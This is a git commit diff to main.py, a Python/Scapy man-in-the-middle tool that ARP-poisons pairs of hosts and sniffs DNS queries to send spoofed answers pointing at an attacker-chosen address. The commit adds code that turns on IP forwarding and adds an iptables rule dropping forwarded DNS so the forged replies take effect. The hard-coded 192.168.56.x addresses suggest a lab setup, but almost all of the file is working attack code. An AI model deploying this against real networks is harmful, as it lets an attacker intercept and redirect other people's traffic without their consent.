0c29c3de48260083297c5004f4b351241572064b
Cing <camiel.oerlemans@gmail.com>
2021-06-16 13:13:15 +0200

    some updates

--- main.py
+++ main.py
@@ -1,10 +1,17 @@
-from scapy.all import *
-from scapy.all import DNS, DNSQR, IP, send, IPv6, sr, UDP, sniff, DNSRR, sendp, Ether, srp1, ARP
-from scapy.layers.l2 import ARP, getmacbyip, Ether
+import logging
+import platform
 import threading
 import time
+from subprocess import Popen, PIPE
 
-load_layer("tls")
+from scapy.all import *
+from scapy.layers.dns import DNS, DNSRR, DNSQR
+from scapy.layers.inet import IP, UDP
+from scapy.layers.inet6 import IPv6
+from scapy.layers.l2 import ARP, getmacbyip, Ether
+from scapy.sendrecv import sendp, send, sniff
+
+# load_layer("tls")
 
 host_ip = "192.168.56.103"
 target_ip = "192.168.56.101"
@@ -16,6 +23,8 @@ ip_to_spoof = '192.168.56.102'
 targets = [{'ip': "192.168.56.101"},
            {'ip': '192.168.56.102'}]
 
+logging.getLogger('scapy').setLevel(logging.WARNING)
+
 
 def arp_poison_targets(victims, sleep=0):
     """
@@ -24,13 +33,12 @@ def arp_poison_targets(victims, sleep=0):
     :param victims: list of ip addresses
     :return:
     """
-    print(sleep)
     assert len(victims) >= 2, 'We must have at least 2 victims to poison'
     while True:
         for i in range(len(victims) - 1):
             for j in range(i + 1, len(victims)):
                 print(i, j)
-                # # arp poison both ways
+                # arp poison both ways
                 arp_poisoning(victims[i], victims[j])
                 arp_poisoning(victims[j], victims[i])
         if sleep > 1:
@@ -49,7 +57,7 @@ def arp_poisoning(target, victim):
     if 'mac' not in target.keys():
         target['mac'] = getmacbyip(target['ip'])
     p = Ether(src=host_mac) / ARP(hwsrc=host_mac, psrc=victim['ip'], hwdst=target['mac'], pdst=target['ip'])
-    sendp(p, iface='enp0s3')
+    sendp(p, iface='enp0s3', verbose=False)
 
 
 # test
@@ -67,33 +75,40 @@ def mitm_attack(victims):
     th.start()
     # arp_poison_targets(victims, sleep=60)
     print('Started, arp poisoning')
+    dns_sniffer()
 
     return th
 
 
 def dns_sniffer():
-    # This function is responsible for sniffing for DNS packets and forwarding them to the spoofer.
+    """
+    This function is responsible for sniffing for DNS packets and forwarding them to the spoofer.
+    :return:
+    """
 
-    global target_ip
     sniff(filter="udp and port 53 and host " + target_ip, prn=dns_spoofer)
 
 
 def dns_spoofer(p):
-    # This function is responsible for sending spoofed DNS responses to the target with the answer as the server address provided by us.
-
-    global target_ip, g_router_ip, ip_to_spoof
+    """
+    This function is responsible for sending spoofed DNS responses to the target with the answer as the server address provided by us.
+    :param p: the packet we received
+    :return:
+    """
+    print(type(p))
+    print(p.show())
+    if not p.haslayer(IP):
+        return
 
     if (p[IP].src == target_ip and
             p.haslayer(DNS) and
             p[DNS].qr == 0 and  # DNS Query
             p[DNS].opcode == 0 and  # DNS Standard Query
             p[DNS].ancount == 0  # Answer Count
-
     ):
 
         print("Sending spoofed DNS response")
-
-        if (p.haslayer(IPv6)):
+        if p.haslayer(IPv6):
             ip_layer = IPv6(src=p[IPv6].dst, dst=p[IPv6].src)
         else:
             ip_layer = IP(src=p[IP].dst, dst=p[IP].src)
@@ -120,7 +135,35 @@ def dns_spoofer(p):
         # Send the spoofed DNS response
         print(dns_resp.show())
         send(dns_resp, verbose=0)
-        print(f"Resolved DNS request for {p[DNS].qd.qname} by {ip_to_spoof}")
+        print("Resolved DNS request for " + p[DNS].qd.qname + " by " + ip_to_spoof)
 
 
-threat = mitm_attack(targets)
+def set_local_settings():
+    """
+    Set local settings of the system to stop forwading ip messages
+    :return:
+    """
+    # Check to see if we are on linux
+    if platform.system() == "Linux":
+        # Enable IP forwarding
+        ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+        ipf_read = ipf.read()
+        if (ipf_read != '1\n'):
+            ipf.write('1\n')
+        ipf.close()
+
+        # Disable DNS Query forwarding
+        firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
+        Popen([firewall], shell=True, stdout=PIPE)
+
+
+def main():
+    """Run the attack"""
+
+    set_local_settings()
+    threat = mitm_attack(targets)
+
+    print('Attack is running')
+
+
+main()
